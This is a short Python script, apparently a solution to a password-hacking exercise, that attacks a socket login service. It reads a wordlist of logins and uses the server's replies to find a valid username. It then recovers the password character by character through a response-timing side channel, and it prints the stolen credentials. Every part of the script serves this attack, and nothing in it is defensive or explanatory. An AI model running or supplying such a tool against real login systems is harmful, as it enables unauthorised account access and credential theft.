import json
import socket
import argparse

# not used
def case_combinations(word: str):
	from itertools import product
	for result in product(*({letter.lower(), letter.upper()} for letter in word)):
		yield ''.join(result)

# not used
def password_generator():
	with open(r'C:\Users\dchav\passwords.txt') as passwords_file:
		for password in passwords_file.read().split():
			for password_combination in case_combinations(password):
				yield password_combination


def login_bruteforce(sock: socket.socket):
	with open(r'C:\Users\dchav\logins.txt') as logins_file:
		for login in logins_file.read().split():
			sock.send(json.dumps({'login': login, 'password': ' '}).encode())
			if json.loads(sock.recv(1024).decode())['result'] == "Wrong password!":
				return login


def password_bruteforce(sock: socket.socket, login: str):
	from string import ascii_letters, digits
	import time
	alphabet = frozenset(ascii_letters + digits)
	password = ''

	from itertools import cycle
	for character in cycle(alphabet):
		sock.send(json.dumps({'login': login, 'password': password + character}).encode())
		start = time.perf_counter()
		response = sock.recv(1024).decode()
		stop = time.perf_counter()
		delta = stop - start
		if delta > 0.1:
			password += character
		elif json.loads(response)['result'] == "Connection success!":
			password += character
			return password


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("hostname")
	parser.add_argument("port")
	args = parser.parse_args()
	ip_address = (args.hostname, int(args.port))

	with socket.socket() as sock:
		sock.connect(ip_address)

		login = login_bruteforce(sock)
		password = password_bruteforce(sock, login)
		print(json.dumps({'login': login, 'password': password}, indent=4))
